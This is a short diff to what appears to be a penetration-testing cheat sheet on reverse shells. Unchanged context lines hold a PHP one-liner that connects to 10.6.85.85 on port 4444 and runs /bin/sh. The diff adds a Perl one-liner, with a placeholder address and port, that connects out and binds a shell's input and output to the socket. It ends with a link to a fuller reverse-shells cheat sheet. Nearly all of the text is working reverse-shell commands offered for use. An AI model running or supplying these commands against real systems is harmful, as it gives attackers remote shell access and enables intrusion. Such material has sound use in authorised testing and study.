@@ -38,7 +38,11 @@ socat
 PHP            
     
     php -r '$sock=fsockopen("10.6.85.85",4444);exec("/bin/sh -i <&3 >&3 2>&3");' 
-   
+
+Perl 
+    perl -e 'use Socket;$i="IP ADDRESS";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+    
+    
 Also Ruby, Java: Reverse shells cheat sheet    
 [Tiberius Reverse Shells](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/reverse-shells.rst) 
 
